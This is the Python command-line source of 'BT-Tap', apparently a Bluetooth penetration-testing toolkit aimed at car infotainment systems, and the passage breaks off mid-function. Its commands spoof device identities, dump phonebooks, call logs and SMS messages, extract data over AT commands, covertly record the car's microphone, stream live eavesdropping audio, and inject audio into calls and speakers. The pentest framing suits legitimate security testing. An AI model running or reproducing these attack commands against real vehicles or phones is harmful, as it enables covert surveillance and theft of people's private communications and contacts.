"""BT-Tap CLI - Bluetooth/BLE Penetration Testing Toolkit for Automotive IVI."""

import json
import os

import click
from rich.table import Table
from rich.panel import Panel

from bt_tap.utils.output import (
    banner, info, success, error, warning, verbose, debug,
    device_table, service_table, vuln_table, channel_table,
    console, target, summary_panel,
    phase, step, result_box,
)
from bt_tap.utils.bt_helpers import run_cmd
from bt_tap.utils.interactive import resolve_address, pick_two_devices


@click.group()
@click.version_option(version="1.0.0")
@click.option("-v", "--verbose", count=True, help="Verbosity: -v verbose, -vv debug")
def main(verbose):
    """BT-Tap: Bluetooth/BLE Penetration Testing Toolkit for Automotive IVI.

    \b
    Modules:
      adapter    - HCI adapter management
      scan       - Discover BT Classic and BLE devices
      recon      - Enumerate services, fingerprint, channel scanning
      spoof      - MAC address spoofing and device impersonation
      pbap       - Phone Book Access Profile (phonebook, call logs)
      map        - Message Access Profile (SMS/MMS)
      hfp        - Hands-Free Profile (call audio intercept/inject)
      audio      - Audio capture, injection, and review
      avrcp      - AVRCP media control and attacks
      opp        - Object Push Profile (file transfer to IVI)
      tpms       - TPMS sensor attacks (BLE + 315/433 MHz SDR)
      vulnscan   - Vulnerability scanning
      hijack     - Full attack chain orchestration
      dos        - DoS and pairing attacks
      fuzz       - Protocol fuzzing (L2CAP, RFCOMM, AT)
      report     - Pentest report generation
      auto       - Automated discovery and attack
    """
    from bt_tap.utils.output import set_verbosity
    set_verbosity(verbose)
    banner()


# ============================================================================
# ADAPTER MANAGEMENT
# ============================================================================
@main.group()
def adapter():
    """HCI Bluetooth adapter management."""


@adapter.command("list")
def adapter_list():
    """List available Bluetooth adapters."""
    from bt_tap.core.adapter import list_adapters

    adapters = list_adapters()
    if not adapters:
        return

    from rich.style import Style as _S
    table = Table(title="[bold #00d4ff]HCI Adapters[/bold #00d4ff]", show_lines=True, border_style="#666666", header_style=_S(bold=True, color="#00d4ff"))
    table.add_column("Name", style="#00d4ff")
    table.add_column("Address", style="#bf5af2")
    table.add_column("Type", style="#ffaa00")
    table.add_column("Bus", style="#4488ff")
    table.add_column("Status", style="bold")

    for a in adapters:
        status_style = "green" if a["status"] == "UP" else "red"
        table.add_row(a["name"], a["address"], a["type"], a["bus"],
                       f"[{status_style}]{a['status']}[/{status_style}]")

    console.print(table)


@adapter.command()
@click.argument("hci", default="hci0")
def up(hci):
    """Bring adapter up."""
    from bt_tap.core.adapter import adapter_up
    adapter_up(hci)


@adapter.command()
@click.argument("hci", default="hci0")
def down(hci):
    """Bring adapter down."""
    from bt_tap.core.adapter import adapter_down
    adapter_down(hci)


@adapter.command()
@click.argument("hci", default="hci0")
def reset(hci):
    """Reset adapter."""
    from bt_tap.core.adapter import adapter_reset
    adapter_reset(hci)


@adapter.command("set-name")
@click.argument("hci")
@click.argument("name")
def set_name(hci, name):
    """Set adapter Bluetooth name (for impersonation)."""
    from bt_tap.core.adapter import set_device_name
    set_device_name(hci, name)


@adapter.command("set-class")
@click.argument("hci")
@click.argument("device_class", default="0x5a020c")
def set_class(hci, device_class):
    """Set device class. Default 0x5a020c = smartphone."""
    from bt_tap.core.adapter import set_device_class
    set_device_class(hci, device_class)


# ============================================================================
# SCANNING
# ============================================================================
@main.group()
def scan():
    """Discover Bluetooth Classic and BLE devices."""


@scan.command("classic")
@click.option("-d", "--duration", default=10, help="Scan duration in seconds")
@click.option("-i", "--hci", default="hci0", help="HCI adapter")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def scan_classic(duration, hci, output):
    """Scan for Bluetooth Classic devices."""
    from bt_tap.core.scanner import scan_classic as _scan

    devices = _scan(duration, hci)
    verbose(f"hcitool scan completed, parsing {len(devices)} results")
    if devices:
        console.print(device_table(devices, "Classic BT Devices"))
    if output:
        _save_json(devices, output)


@scan.command("ble")
@click.option("-d", "--duration", default=10, help="Scan duration in seconds")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def scan_ble(duration, output):
    """Scan for BLE devices."""
    from bt_tap.core.scanner import scan_ble_sync

    devices = scan_ble_sync(duration)
    if devices:
        console.print(device_table(devices, "BLE Devices"))
    if output:
        _save_json(devices, output)


@scan.command("all")
@click.option("-d", "--duration", default=10, help="Scan duration in seconds")
@click.option("-i", "--hci", default="hci0", help="HCI adapter")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def scan_all(duration, hci, output):
    """Scan both Classic BT and BLE simultaneously."""
    from bt_tap.core.scanner import scan_all as _scan_all

    devices = _scan_all(duration, hci)
    if devices:
        console.print(device_table(devices, "All Bluetooth Devices"))
    if output:
        _save_json(devices, output)


# ============================================================================
# RECONNAISSANCE
# ============================================================================
@main.group()
def recon():
    """Service enumeration and device fingerprinting."""


@recon.command("sdp")
@click.argument("address", required=False, default=None)
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def recon_sdp(address, output):
    """Browse SDP services on a target device."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.recon.sdp import browse_services

    services = browse_services(address)
    if services:
        console.print(service_table(services, f"SDP Services: {address}"))

        # Show raw details
        for svc in services:
            profile = svc.get("profile", "")
            if any(kw in profile for kw in ["PBAP", "MAP", "HFP", "A2DP", "SPP"]):
                success(f"  INTERESTING: {svc.get('name')} -> {profile} "
                        f"(ch={svc.get('channel')})")

    if output:
        _save_json(services, output)


@recon.command("gatt")
@click.argument("address", required=False, default=None)
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def recon_gatt(address, output):
    """Enumerate BLE GATT services and characteristics."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.recon.gatt import enumerate_services_sync

    services = enumerate_services_sync(address)
    for svc in services:
        console.print(f"\n[bold cyan]Service: {svc['description']}[/bold cyan]")
        console.print(f"  UUID: {svc['uuid']}  Handle: {svc['handle']}")
        for char in svc["characteristics"]:
            props = ", ".join(char["properties"])
            console.print(f"  [green]{char['description']}[/green] [{props}]")
            console.print(f"    UUID: {char['uuid']}")
            if char.get("value_hex"):
                console.print(f"    Value: {char['value_hex']} | {char.get('value_str', '')}")

    if output:
        _save_json(services, output)


@recon.command("fingerprint")
@click.argument("address", required=False, default=None)
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def recon_fingerprint(address, output):
    """Fingerprint a device and identify IVI characteristics."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.recon.fingerprint import fingerprint_device

    fp = fingerprint_device(address)

    panel_text = f"""[cyan]Address:[/cyan] {fp['address']}
[cyan]Name:[/cyan] {fp['name']}
[cyan]Manufacturer:[/cyan] {fp['manufacturer']}
[cyan]Is IVI:[/cyan] {'[green]YES[/green]' if fp['is_ivi'] else '[red]NO[/red]'}
[cyan]Profiles:[/cyan] {len(fp['profiles'])}"""

    console.print(Panel(panel_text, title="Device Fingerprint", border_style="cyan"))

    if fp["attack_surface"]:
        console.print("\n[bold red]Attack Surface:[/bold red]")
        for surface in fp["attack_surface"]:
            console.print(f"  [red]>[/red] {surface}")

    if output:
        _save_json(fp, output)


@recon.command("ssp")
@click.argument("address", required=False, default=None)
def recon_ssp(address):
    """Check if device supports Secure Simple Pairing."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.recon.sdp import check_ssp

    result = check_ssp(address)
    if result is True:
        success(f"{address} supports SSP (more secure pairing)")
    elif result is False:
        warning(f"{address} may NOT support SSP (legacy pairing - easier to attack)")
    else:
        error(f"Could not determine SSP support for {address}")


@recon.command("rfcomm-scan")
@click.argument("address", required=False, default=None)
@click.option("-t", "--timeout", default=2.0, help="Timeout per channel")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def recon_rfcomm_scan(address, timeout, output):
    """Scan all RFCOMM channels (1-30) for hidden services."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.recon.rfcomm_scan import RFCOMMScanner

    scanner = RFCOMMScanner(address)
    results = scanner.scan_all_channels(timeout_per_ch=timeout)

    # Show open/interesting channels only
    interesting = [r for r in results if r["status"] != "closed"]
    if interesting:
        console.print(channel_table(interesting, title="RFCOMM Scan Results"))
    else:
        warning("No open RFCOMM channels found")

    open_channels = [r for r in results if r["status"] == "open"]
    info(f"Scanned 30 channels: {len(open_channels)} open")

    if output:
        # Serialize (strip raw_response bytes for JSON)
        for r in results:
            r.pop("raw_response", None)
        _save_json(results, output)


@recon.command("l2cap-scan")
@click.argument("address", required=False, default=None)
@click.option("--dynamic", is_flag=True, help="Also scan dynamic PSM range")
@click.option("-t", "--timeout", default=1.0, help="Timeout per PSM")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def recon_l2cap_scan(address, dynamic, timeout, output):
    """Scan L2CAP PSM values for open services."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.recon.l2cap_scan import L2CAPScanner

    scanner = L2CAPScanner(address)
    results = scanner.scan_standard_psms(timeout=timeout)

    if dynamic:
        results.extend(scanner.scan_dynamic_psms(timeout=timeout))

    if results:
        console.print(channel_table(results, title="L2CAP Scan Results"))

    open_psms = [r for r in results if r["status"] in ("open", "auth_required")]
    if not open_psms:
        warning("No open L2CAP PSMs found")

    if output:
        _save_json(results, output)


@recon.command("capture-start")
@click.option("-o", "--output", default="bt_capture.log", help="Output file")
def recon_capture_start(output):
    """Start HCI traffic capture via btmon."""
    from bt_tap.recon.hci_capture import HCICapture

    cap = HCICapture()
    if cap.start(output):
        success(f"btmon capture started -> {output}")
    else:
        error("Failed to start capture")


@recon.command("capture-stop")
def recon_capture_stop():
    """Stop HCI traffic capture."""
    from bt_tap.recon.hci_capture import HCICapture

    cap = HCICapture()
    result = cap.stop()
    if result:
        success(f"Capture stopped: {result}")
    else:
        warning("No capture appears to be running")


@recon.command("pairing-mode")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
def recon_pairing_mode(address, hci):
    """Detect target's pairing mode and IO capabilities."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.recon.hci_capture import detect_pairing_mode

    result = detect_pairing_mode(address, hci)
    panel_text = (
        f"[cyan]SSP Supported:[/cyan] {result.get('ssp_supported') if result.get('ssp_supported') is not None else 'Inconclusive (probe failed)'}\n"
        f"[cyan]IO Capability:[/cyan] {result.get('io_capability', 'Unknown')}\n"
        f"[cyan]Pairing Method:[/cyan] {result.get('pairing_method', 'Unknown')}"
    )
    console.print(Panel(panel_text, title="Pairing Mode Detection", border_style="cyan"))


# ============================================================================
# SPOOFING
# ============================================================================
@main.group()
def spoof():
    """MAC address spoofing and device impersonation."""


@spoof.command("mac")
@click.argument("target_mac", required=False, default=None)
@click.option("-i", "--hci", default="hci0", help="HCI adapter")
@click.option("-m", "--method", default="auto",
              type=click.Choice(["auto", "bdaddr", "spooftooph", "btmgmt"]))
def spoof_mac(target_mac, hci, method):
    """Spoof adapter MAC address to target."""
    target_mac = resolve_address(target_mac)
    if not target_mac:
        return
    from bt_tap.core.spoofer import spoof_address
    spoof_address(hci, target_mac, method)


@spoof.command("clone")
@click.argument("target_mac", required=False, default=None)
@click.argument("target_name", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
@click.option("-c", "--device-class", default="0x5a020c",
              help="Device class (default: smartphone)")
def spoof_clone(target_mac, target_name, hci, device_class):
    """Full identity clone: MAC + name + device class."""
    target_mac = resolve_address(target_mac)
    if not target_mac:
        return
    if not target_name:
        error("Phone name is required for identity clone (e.g., 'Galaxy S24')")
        return
    from bt_tap.core.spoofer import clone_device_identity
    clone_device_identity(hci, target_mac, target_name, device_class)


@spoof.command("restore")
@click.option("-i", "--hci", default="hci0")
@click.option("-m", "--method", default="auto",
              type=click.Choice(["auto", "bdaddr", "spooftooph", "btmgmt"]))
def spoof_restore(hci, method):
    """Restore adapter to its original MAC address."""
    from bt_tap.core.spoofer import restore_original_mac
    restore_original_mac(hci, method)


# ============================================================================
# PBAP - Phone Book Access
# ============================================================================
@main.group()
def pbap():
    """Phone Book Access Profile - download phonebook and call logs."""


@pbap.command("pull")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None,
              help="RFCOMM channel (auto-discovered if not specified)")
@click.option("-p", "--path", default="telecom/pb.vcf",
              help="PBAP path to pull")
@click.option("-o", "--output-dir", default="pbap_dump")
def pbap_pull(address, channel, path, output_dir):
    """Pull a specific phonebook object."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.pbap import PBAPClient
    from bt_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Phonebook")
        if channel is None:
            channel = find_service_channel(address, "PBAP")
        if channel is None:
            error("Could not find PBAP channel. Specify with -c.")
            return

    client = PBAPClient(address, channel=channel)
    if not client.connect():
        return

    try:
        data = client.pull_phonebook(path)
        if data:
            os.makedirs(output_dir, exist_ok=True)
            filename = os.path.join(output_dir, path.replace("/", "_"))
            with open(filename, "w") as f:
                f.write(data)
            success(f"Saved to {filename}")
            console.print(data[:2000])  # Preview
    finally:
        client.disconnect()


@pbap.command("dump")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
@click.option("-o", "--output-dir", default="pbap_dump")
def pbap_dump(address, channel, output_dir):
    """Dump ALL phonebook data: contacts, call logs, favorites, SIM."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.pbap import PBAPClient
    from bt_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Phonebook")
        if channel is None:
            channel = find_service_channel(address, "PBAP")
        if channel is None:
            error("Could not find PBAP channel. Specify with -c.")
            return

    client = PBAPClient(address, channel=channel)
    if not client.connect():
        return

    try:
        results = client.pull_all_data(output_dir)
        if results:
            table = Table(title="PBAP Dump Results")
            table.add_column("Path")
            table.add_column("Description")
            table.add_column("File")
            table.add_column("Size", justify="right")
            for path, info_dict in results.items():
                table.add_row(path, info_dict["description"],
                              info_dict["file"], str(info_dict["size"]))
            console.print(table)
    finally:
        client.disconnect()


# ============================================================================
# MAP - Message Access
# ============================================================================
@main.group("map")
def map_cmd():
    """Message Access Profile - download SMS/MMS messages."""


@map_cmd.command("list")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
@click.option("-f", "--folder", default="telecom/msg/inbox")
def map_list(address, channel, folder):
    """List messages in a folder."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.map_client import MAPClient
    from bt_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Message")
        if channel is None:
            channel = find_service_channel(address, "MAP")
        if channel is None:
            error("Could not find MAP channel. Specify with -c.")
            return

    client = MAPClient(address, channel=channel)
    if not client.connect():
        return

    try:
        listing = client.get_messages_listing(folder)
        if listing:
            console.print(listing)
    finally:
        client.disconnect()


@map_cmd.command("dump")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
@click.option("-o", "--output-dir", default="map_dump")
def map_dump(address, channel, output_dir):
    """Dump all messages from all folders."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.map_client import MAPClient
    from bt_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Message")
        if channel is None:
            channel = find_service_channel(address, "MAP")
        if channel is None:
            error("Could not find MAP channel. Specify with -c.")
            return

    client = MAPClient(address, channel=channel)
    if not client.connect():
        return

    try:
        client.dump_all_messages(output_dir)
    finally:
        client.disconnect()


# ============================================================================
# HFP - Hands-Free Profile (Audio)
# ============================================================================
@main.group()
def hfp():
    """Hands-Free Profile - call audio interception and injection."""


@hfp.command("connect")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
def hfp_connect(address, channel):
    """Connect HFP and establish Service Level Connection."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.hfp import HFPClient
    from bt_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")

    if channel is None:
        error("Could not find HFP channel. Specify with -c.")
        return

    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        success("HFP SLC ready. Use other hfp commands for audio operations.")
        # Interactive AT command mode
        info("Entering AT command mode. Type 'quit' to exit.")
        while True:
            try:
                cmd = input("AT> ").strip()
                if cmd.lower() in ("quit", "exit", "q"):
                    break
                if cmd:
                    client.send_at(cmd)
            except (EOFError, KeyboardInterrupt):
                break
        client.disconnect()


@hfp.command("capture")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
@click.option("-o", "--output", default="hfp_capture.wav")
@click.option("-d", "--duration", default=60, help="Capture duration in seconds")
def hfp_capture(address, channel, output, duration):
    """Capture call audio to WAV file via SCO link."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.hfp import HFPClient
    from bt_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")

    if channel is None:
        error("Could not find HFP channel.")
        return

    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        client.capture_audio(output, duration)
        client.disconnect()


@hfp.command("inject")
@click.argument("address", required=False, default=None)
@click.argument("audio_file")
@click.option("-c", "--channel", type=int, default=None)
def hfp_inject(address, audio_file, channel):
    """Inject audio file into call via SCO link."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.hfp import HFPClient
    from bt_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")

    if channel is None:
        error("Could not find HFP channel.")
        return

    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        client.inject_audio(audio_file)
        client.disconnect()


@hfp.command("at")
@click.argument("address", required=False, default=None)
@click.argument("command")
@click.option("-c", "--channel", type=int, default=None)
def hfp_at(address, command, channel):
    """Send a raw AT command to the HFP Audio Gateway."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.hfp import HFPClient
    from bt_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")

    if channel is None:
        error("Could not find HFP channel.")
        return

    client = HFPClient(address, channel=channel)
    if client.connect():
        client.setup_slc()
        result = client.send_at(command)
        console.print(f"[yellow]{result}[/yellow]")
        client.disconnect()


@hfp.command("dtmf")
@click.argument("address", required=False, default=None)
@click.argument("digits")
@click.option("-c", "--channel", type=int, default=None)
@click.option("--interval", default=0.3, help="Delay between digits (seconds)")
def hfp_dtmf(address, digits, channel, interval):
    """Send DTMF tones (e.g., '1234#')."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.hfp import HFPClient
    from bt_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")
    if channel is None:
        error("Could not find HFP channel.")
        return

    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        client.dtmf_sequence(digits, interval)
        client.disconnect()


@hfp.command("hold")
@click.argument("address", required=False, default=None)
@click.argument("action", type=int)
@click.option("-c", "--channel", type=int, default=None)
def hfp_hold(address, action, channel):
    """Call hold/swap (0=release, 1=hold+accept, 2=swap, 3=conference)."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.hfp import HFPClient
    from bt_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")
    if channel is None:
        error("Could not find HFP channel.")
        return

    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        result = client.call_hold(action)
        console.print(f"[yellow]{result}[/yellow]")
        client.disconnect()


@hfp.command("redial")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
def hfp_redial(address, channel):
    """Redial the last dialed number."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.hfp import HFPClient
    from bt_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")
    if channel is None:
        error("Could not find HFP channel.")
        return

    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        result = client.redial()
        console.print(f"[yellow]{result}[/yellow]")
        client.disconnect()


@hfp.command("voice")
@click.argument("address", required=False, default=None)
@click.option("--on/--off", default=True, help="Enable or disable voice recognition")
@click.option("-c", "--channel", type=int, default=None)
def hfp_voice(address, on, channel):
    """Activate/deactivate voice recognition on the IVI."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.hfp import HFPClient
    from bt_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")
    if channel is None:
        error("Could not find HFP channel.")
        return

    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        result = client.voice_recognition(on)
        console.print(f"[yellow]{result}[/yellow]")
        client.disconnect()


# ============================================================================
# AUDIO - Unified Audio Operations (A2DP + HFP via PulseAudio)
# ============================================================================
@main.group()
def audio():
    """Audio capture, injection, and eavesdropping via PulseAudio."""


@audio.command("record-mic")
@click.argument("mac", required=False, default=None)
@click.option("-o", "--output", default="car_mic.wav")
@click.option("-d", "--duration", default=60, help="Duration in seconds (0=until Ctrl+C)")
@click.option("--no-setup", is_flag=True, help="Skip auto profile/mic setup")
def audio_record_mic(mac, output, duration, no_setup):
    """Record from car's Bluetooth microphone (eavesdrop).

    Automatically switches to HFP profile, mutes laptop mic,
    unmutes car mic at 100% volume, and records using parecord.
    """
    mac = resolve_address(mac)
    if not mac:
        return
    from bt_tap.attack.a2dp import record_car_mic
    record_car_mic(mac, output, duration, auto_setup=not no_setup)


@audio.command("live")
@click.argument("mac", required=False, default=None)
@click.option("--no-setup", is_flag=True)
def audio_live(mac, no_setup):
    """Live eavesdrop: stream car mic to laptop speakers in real-time."""
    mac = resolve_address(mac)
    if not mac:
        return
    from bt_tap.attack.a2dp import live_eavesdrop
    live_eavesdrop(mac, auto_setup=not no_setup)


@audio.command("play")
@click.argument("mac", required=False, default=None)
@click.argument("audio_file")
@click.option("-v", "--volume", default=80, help="Volume in % (1-100)")
def audio_play(mac, audio_file, volume):
    """Play audio file through car speakers via A2DP."""
    mac = resolve_address(mac)
    if not mac:
        return
    from bt_tap.attack.a2dp import play_to_car
    play_to_car(mac, audio_file, volume)


@audio.command("loopback")
@click.argument("mac", required=False, default=None)
@click.option("-s", "--mic-source", default=None, help="Laptop mic source (auto-detected)")
def audio_loopback(mac, mic_source):
    """Route laptop mic to car speakers in real-time."""
    mac = resolve_address(mac)
    if not mac:
        return
    from bt_tap.attack.a2dp import stream_mic_to_car
    stream_mic_to_car(mac, mic_source)


@audio.command("loopback-stop")
def audio_loopback_stop():
    """Stop all audio loopback modules."""
    from bt_tap.attack.a2dp import stop_loopback
    stop_loopback()


@audio.command("capture")
@click.argument("mac", required=False, default=None)
@click.option("-o", "--output", default="a2dp_capture.wav")
@click.option("-d", "--duration", default=60, help="Capture duration in seconds")
def audio_capture_a2dp(mac, output, duration):
    """Capture A2DP media stream to WAV file."""
    mac = resolve_address(mac)
    if not mac:
        return
    from bt_tap.attack.a2dp import capture_a2dp
    capture_a2dp(mac, output, duration)


@audio.command("profile")
@click.argument("mac", required=False, default=None)
@click.argument("mode", type=click.Choice(["hfp", "a2dp"]))
def audio_profile(mac, mode):
    """Switch Bluetooth audio profile (hfp=mic, a2dp=media)."""
    mac = resolve_address(mac)
    if not mac:
        return
    from bt_tap.attack.a2dp import set_profile_hfp, set_profile_a2dp
    if mode == "hfp":
        set_profile_hfp(mac)
    else:
        set_profile_a2dp(mac)


@audio.command("devices")
def audio_devices():
    """List Bluetooth audio sources and sinks."""
    from bt_tap.attack.a2dp import list_bt_audio_sources, list_bt_audio_sinks

    sources = list_bt_audio_sources()
    sinks = list_bt_audio_sinks()

    if sources:
        table = Table(title="Bluetooth Audio Sources (Microphones)")
        table.add_column("ID")
        table.add_column("Name")
        table.add_column("State")
        for s in sources:
            table.add_row(s["id"], s["name"], s.get("state", ""))
        console.print(table)

    if sinks:
        table = Table(title="Bluetooth Audio Sinks (Speakers)")
        table.add_column("ID")
        table.add_column("Name")
        for s in sinks:
            table.add_row(s["id"], s["name"])
        console.print(table)

    if not sources and not sinks:
        warning("No Bluetooth audio devices found in PulseAudio/PipeWire")


@audio.command("diagnose")
@click.argument("mac", required=False, default=None)
def audio_diagnose(mac):
    """Diagnose Bluetooth audio issues for a device."""
    mac = resolve_address(mac)
    if not mac:
        return
    from bt_tap.attack.a2dp import diagnose_bt_audio
    diagnose_bt_audio(mac)


@audio.command("restart")
def audio_restart():
    """Restart PipeWire/PulseAudio to fix audio routing issues."""
    from bt_tap.attack.a2dp import restart_audio_services
    restart_audio_services()


@audio.command("list")
@click.option("-d", "--dir", "directory", default=".", help="Directory to search")
def audio_list(directory):
    """List all captured WAV files with duration and size."""
    from bt_tap.attack.a2dp import list_captures

    captures = list_captures(directory)
    if not captures:
        warning(f"No WAV files found in {directory}")
        return

    table = Table(title="Captured Audio Files", show_lines=True)
    table.add_column("#", style="dim", width=4)
    table.add_column("File", style="cyan")
    table.add_column("Duration", style="green", justify="right")
    table.add_column("Size", style="yellow", justify="right")
    table.add_column("Modified", style="magenta")

    for i, cap in enumerate(captures, 1):
        dur = cap["duration_secs"]
        dur_str = f"{int(dur // 60)}:{int(dur % 60):02d}" if dur > 0 else "N/A"
        size_str = f"{cap['size_bytes'] / 1024:.1f} KB"
        table.add_row(str(i), cap["filename"], dur_str, size_str, cap["modified"])
    console.print(table)


@audio.command("playback")
@click.argument("file")
def audio_playback(file):
    """Play a captured audio file on laptop speakers."""
    from bt_tap.attack.a2dp import play_capture

    if play_capture(file):
        success("Playback complete")
    else:
        error("Playback failed")


@audio.command("review")
@click.option("-d", "--dir", "directory", default=".", help="Directory to search")
def audio_review(directory):
    """Interactive audio review: list, select, play, repeat."""
    from bt_tap.attack.a2dp import interactive_review
    interactive_review(directory)


# ============================================================================
# OPP - Object Push
# ============================================================================
@main.group()
def opp():
    """Object Push Profile - push files to IVI."""


@opp.command("push")
@click.argument("address", required=False, default=None)
@click.argument("filepath")
@click.option("-c", "--channel", type=int, default=None)
def opp_push(address, filepath, channel):
    """Push a file to the target device."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.opp import OPPClient
    from bt_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Object Push")
        if channel is None:
            channel = find_service_channel(address, "OPP")

    if channel is None:
        error("Could not find OPP channel.")
        return

    client = OPPClient(address, channel=channel)
    if client.connect():
        client.push_file(filepath)
        client.disconnect()


@opp.command("vcard")
@click.argument("address", required=False, default=None)
@click.option("-n", "--name", required=True, help="Contact name")
@click.option("-p", "--phone", required=True, help="Phone number")
@click.option("-e", "--email", default="", help="Email address")
@click.option("-c", "--channel", type=int, default=None)
def opp_vcard(address, name, phone, email, channel):
    """Push a crafted vCard contact to IVI."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.opp import OPPClient
    from bt_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Object Push")

    if channel is None:
        error("Could not find OPP channel.")
        return

    client = OPPClient(address, channel=channel)
    if client.connect():
        client.push_vcard(name, phone, email)
        client.disconnect()


# ============================================================================
# AT / BLUESNARFER - Direct AT Command Extraction
# ============================================================================
@main.group("at")
def at_cmd():
    """AT command data extraction via RFCOMM (bluesnarfer alternative)."""


@at_cmd.command("connect")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=1, help="RFCOMM channel")
def at_connect(address, channel):
    """Interactive AT command session over RFCOMM."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.bluesnarfer import ATClient

    client = ATClient(address, channel=channel)
    if not client.connect():
        return

    info("AT session ready. Type 'quit' to exit.")
    while True:
        try:
            cmd = input("AT> ").strip()
            if cmd.lower() in ("quit", "exit", "q"):
                break
            if cmd:
                result = client.send_at(cmd)
                console.print(result)
        except (EOFError, KeyboardInterrupt):
            break
    client.disconnect()


@at_cmd.command("dump")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=1)
@click.option("-o", "--output-dir", default="at_dump")
def at_dump(address, channel, output_dir):
    """Dump all data via AT commands: phonebook, SMS, device info."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.bluesnarfer import ATClient

    client = ATClient(address, channel=channel)
    if not client.connect():
        return
    try:
        results = client.dump_all(output_dir)
        if results:
            console.print(f"\n[bold green]Dump complete -> {output_dir}/[/bold green]")
    finally:
        client.disconnect()


@at_cmd.command("snarf")
@click.argument("address", required=False, default=None)
@click.option("-m", "--memory", default="ME",
              type=click.Choice(["SM", "ME", "DC", "RC", "MC", "FD", "ON"]))
@click.option("-r", "--range", "entry_range", default="1-100")
def at_snarf(address, memory, entry_range):
    """Use bluesnarfer binary for phonebook extraction."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.bluesnarfer import bluesnarfer_extract
    parts = entry_range.split("-")
    if len(parts) != 2:
        error("Range must be START-END (e.g., 1-100)")
        return
    try:
        start, end = int(parts[0]), int(parts[1])
    except ValueError:
        error("Range values must be integers")
        return
    bluesnarfer_extract(address, memory, start, end)


# ============================================================================
# VULNSCAN - Vulnerability Scanner
# ============================================================================
@main.command("vulnscan")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def vulnscan(address, hci, output):
    """Scan target for known Bluetooth vulnerabilities.

    \b
    Checks for: BlueBorne, KNOB, BIAS, BLURtooth, BLUFFS,
    legacy pairing, open services, and more.
    """
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.vuln_scanner import scan_vulnerabilities
    findings = scan_vulnerabilities(address, hci)
    console.print(vuln_table(findings))
    if output:
